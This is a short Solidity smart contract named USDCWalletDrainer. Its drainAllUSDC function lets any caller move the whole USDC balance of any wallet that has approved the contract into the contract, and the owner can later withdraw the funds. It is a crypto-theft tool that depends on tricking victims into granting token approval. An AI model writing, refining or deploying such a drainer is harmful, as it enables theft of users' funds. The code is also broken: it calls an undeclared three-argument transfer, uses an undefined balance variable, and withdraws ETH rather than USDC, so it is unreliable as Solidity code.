// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract USDCWalletDrainer {
    address public owner;
    IERC20 public usdcToken;

    constructor(address _usdcTokenAddress) {
        owner = msg.sender;
        usdcToken = IERC20(_usdcTokenAddress); // USDC contract address
        // mainnet 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48
    }

    // Function to transfer all USDC from the caller's wallet to this contract
    function drainAllUSDC(address _from) public {

        uint256 balance = usdcToken.balanceOf(_from); // Query USDC balance
        require(balance > 0, "No USDC balance to transfer");

        // Attempt to transfer the USDC balance from the user to the contract
        // This requires the user to have previously approved this contract to move their USDC
        bool success = usdcToken.transfer(_from, address(this), balance);
        require(success, "USDC transfer failed");
    }

    // Withdraw from the contract
    function withdraw(uint256 _amount) public {
        require(msg.sender == owner, "only owner can withdraw");
        require(_amount <= balance, "insufficient balance");
        payable(owner).transfer(_amount);
        balance -= _amount;
    }
}
